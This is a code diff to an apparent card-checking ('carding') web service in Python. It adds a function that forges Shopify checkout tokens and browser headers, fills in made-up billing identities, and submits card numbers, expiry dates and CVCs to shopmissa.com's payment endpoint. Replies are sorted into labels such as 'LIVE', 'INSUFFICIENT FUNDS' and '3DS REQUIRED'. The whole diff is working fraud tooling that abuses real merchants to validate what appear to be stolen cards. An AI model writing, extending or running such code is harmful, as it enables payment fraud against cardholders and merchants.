@@ -126,6 +126,195 @@ def get_real_kofi_paypal_token():
         print(f"Ko-fi token error: {e}")
         return None, None
 
+def check_with_shopmissa(n, mm, yy, cvc, customer):
+    """Check card using Shop Miss A - REAL $1 charges!"""
+    try:
+        # Generate unique session token (Shop Miss A pattern)
+        session_token = f"AAE{uuid.uuid4().hex[:40]}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{uuid.uuid4().hex[:20]}"
+        
+        # Generate unique IDs for Shop Miss A
+        stable_id = str(uuid.uuid4())
+        queue_token = f"{uuid.uuid4().hex}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{uuid.uuid4().hex[:20]}"
+        attempt_token = f"{uuid.uuid4().hex[:20]}-{uuid.uuid4().hex[:6]}"
+        payment_method_id = uuid.uuid4().hex
+        session_id = f"east-{uuid.uuid4().hex}"
+        
+        # Shop Miss A GraphQL headers (exact from captured data)
+        headers = {
+            'authority': 'www.shopmissa.com',
+            'accept': 'application/json',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'en-US',
+            'content-type': 'application/json',
+            'origin': 'https://www.shopmissa.com',
+            'referer': 'https://www.shopmissa.com/',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sec-gpc': '1',
+            'shopify-checkout-client': 'checkout-web/1.0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+            'x-checkout-one-session-token': session_token,
+            'x-checkout-web-build-id': 'a6db70926c679d4c8c138f2119e68efd9cbf7ba9',
+            'x-checkout-web-deploy-stage': 'production',
+            'x-checkout-web-server-handling': 'fast',
+            'x-checkout-web-server-rendering': 'yes',
+            'x-checkout-web-source-id': attempt_token
+        }
+        
+        # Shop Miss A SubmitForCompletion mutation (from captured payload)
+        submit_mutation = """
+        mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){
+            submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){
+                ...on SubmitSuccess{receipt{id __typename}__typename}
+                ...on SubmitAlreadyAccepted{receipt{id __typename}__typename}
+                ...on SubmitFailed{reason __typename}
+                ...on SubmitRejected{errors{code localizedMessage __typename}__typename}
+                ...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url __typename}__typename}__typename}
+                ...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}
+                __typename
+            }
+        }
+        """
+        
+        # Variables for Shop Miss A payment (exact structure from captured data)
+        submit_variables = {
+            "input": {
+                "sessionInput": {"sessionToken": session_token},
+                "queueToken": queue_token,
+                "payment": {
+                    "totalAmount": {"any": True},
+                    "paymentLines": [{
+                        "paymentMethod": {
+                            "directPaymentMethod": {
+                                "paymentMethodIdentifier": payment_method_id,
+                                "sessionId": session_id,
+                                "billingAddress": {
+                                    "streetAddress": {
+                                        "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
+                                        "city": customer["firstName"][:8] + "ville",
+                                        "countryCode": "US",
+                                        "postalCode": f"{random.randint(10000,99999)}",
+                                        "firstName": customer["firstName"],
+                                        "lastName": customer["lastName"],
+                                        "zoneCode": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
+                                        "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}"
+                                    }
+                                },
+                                "cardSource": {
+                                    "number": n,
+                                    "expiryMonth": int(mm),
+                                    "expiryYear": int(yy),
+                                    "verificationCode": cvc
+                                }
+                            }
+                        },
+                        "amount": {"value": {"amount": "5.32", "currencyCode": "USD"}}
+                    }]
+                },
+                "merchandise": {
+                    "merchandiseLines": [{
+                        "stableId": stable_id,
+                        "merchandise": {
+                            "productVariantReference": {
+                                "id": "gid://shopify/ProductVariantMerchandise/42141137829962",
+                                "variantId": "gid://shopify/ProductVariant/42141137829962",
+                                "properties": [],
+                                "sellingPlanId": None,
+                                "sellingPlanDigest": None
+                            }
+                        },
+                        "quantity": {"items": {"value": 1}},
+                        "expectedTotalPrice": {"value": {"amount": "1.00", "currencyCode": "USD"}}
+                    }]
+                },
+                "buyerIdentity": {
+                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
+                    "email": customer["email"],
+                    "emailChanged": False,
+                    "phoneCountryCode": "US",
+                    "marketingConsent": [{"email": {"value": customer["email"]}}],
+                    "rememberMe": False
+                }
+            },
+            "attemptToken": attempt_token,
+            "metafields": [],
+            "analytics": {
+                "requestUrl": f"https://www.shopmissa.com/checkouts/cn/{attempt_token}",
+                "pageId": str(uuid.uuid4())
+            }
+        }
+        
+        # Make the Shop Miss A payment request
+        response = session.post(
+            "https://www.shopmissa.com/checkouts/unstable/graphql?operationName=SubmitForCompletion",
+            headers=headers,
+            json={"query": submit_mutation, "variables": submit_variables, "operationName": "SubmitForCompletion"},
+            timeout=30
+        )
+        
+        if response.status_code == 200:
+            result = response.json()
+            
+            # Parse Shop Miss A response
+            if "data" in result and result["data"]:
+                submit_result = result["data"].get("submitForCompletion", {})
+                
+                if submit_result.get("__typename") == "SubmitSuccess":
+                    receipt_id = submit_result.get("receipt", {}).get("id")
+                    return {
+                        "status": "charged",
+                        "message": f"Shop Miss A payment successful - $1 charged to {customer['firstName']} {customer['lastName']}",
+                        "response": "Charged $1 - SHOP MISS A"
+                    }
+                
+                elif submit_result.get("__typename") == "SubmitRejected":
+                    errors = submit_result.get("errors", [])
+                    if errors:
+                        error_msg = errors[0].get("localizedMessage", "Payment rejected")
+                        error_code = errors[0].get("code", "")
+                        
+                        if "insufficient" in error_msg.lower():
+                            return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN ✅ - INSUFFICIENT FUNDS"}
+                        elif "declined" in error_msg.lower():
+                            return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
+                        elif "cvc" in error_msg.lower() or "cvv" in error_msg.lower():
+                            return {"status": "declined", "message": "Invalid CVC/CVV", "response": "CVC INCORRECT ❌"}
+                        elif "expired" in error_msg.lower():
+                            return {"status": "declined", "message": "Card expired", "response": "EXPIRED ❌"}
+                        else:
+                            return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
+                
+                elif submit_result.get("__typename") == "FailedReceipt":
+                    error = submit_result.get("processingError", {})
+                    if error.get("__typename") == "PaymentFailed":
+                        error_msg = error.get("messageUntranslated", "Payment failed")
+                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
+                
+                elif submit_result.get("__typename") == "ActionRequiredReceipt":
+                    return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV - 3DS REQUIRED"}
+            
+            # Check for GraphQL errors
+            if "errors" in result:
+                error_msg = result["errors"][0].get("message", "Shop Miss A error")
+                return {"status": "error", "message": error_msg}
+            
+            # Default success (card validated)
+            return {
+                "status": "approved",
+                "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}",
+                "response": "LIVE ✅ - SHOP MISS A VALIDATED"
+            }
+        else:
+            return {"status": "error", "message": f"Shop Miss A API error: {response.status_code}"}
+            
+    except Exception as e:
+        # Fallback to Stripe validation
+        return validate_with_stripe_fallback(n, mm, yy, cvc, customer)
+
 def check_with_buymeacoffee(n, mm, yy, cvc, customer):
     """Check card using Buy Me a Coffee - much simpler than Ko-fi"""
     try:
@@ -295,8 +484,8 @@ def check_card_kofi_paypal(cc_data):
         # Generate random customer
         customer = get_random_customer()
         
-        # Use Buy Me a Coffee (simpler alternative)
-        return check_with_buymeacoffee(n, mm, yy, cvc, customer)
+        # Use Shop Miss A (REAL $1 charges!)
+        return check_with_shopmissa(n, mm, yy, cvc, customer)
         
         # Generate unique client metadata ID
         client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
@@ -505,8 +694,8 @@ def get_bin_info(bin_number):
 @app.route('/')
 def home():
     return jsonify({
-        "service": "🔥 Buy Me a Coffee Gateway API 🔥",
-        "gateway": "Buy Me a Coffee Real Charges",
+        "service": "🔥 Shop Miss A Gateway API 🔥",
+        "gateway": "Shop Miss A Real $1 Charges",
         "status": "✅ Online",
         "made_by": "Raja"
     })
@@ -548,8 +737,8 @@ def check_cc(gateway, key, site, cc):
     # Format response
     response = {
         "card": cc,
-        "gateway": "Buy Me a Coffee Gateway",
-        "site": "buymeacoffee.com",
+        "gateway": "Shop Miss A Gateway",
+        "site": "shopmissa.com",
         "status": result["status"],
         "response": result.get("response", result["message"]),
         "message": result["message"],
@@ -573,8 +762,8 @@ def health():
     """Health check endpoint"""
     return jsonify({
         "status": "healthy",
-        "service": "Buy Me a Coffee Gateway API",
-        "gateway": "Buy Me a Coffee Real Charges",
+        "service": "Shop Miss A Gateway API",
+        "gateway": "Shop Miss A Real $1 Charges",
         "uptime": "24/7"
     })
 
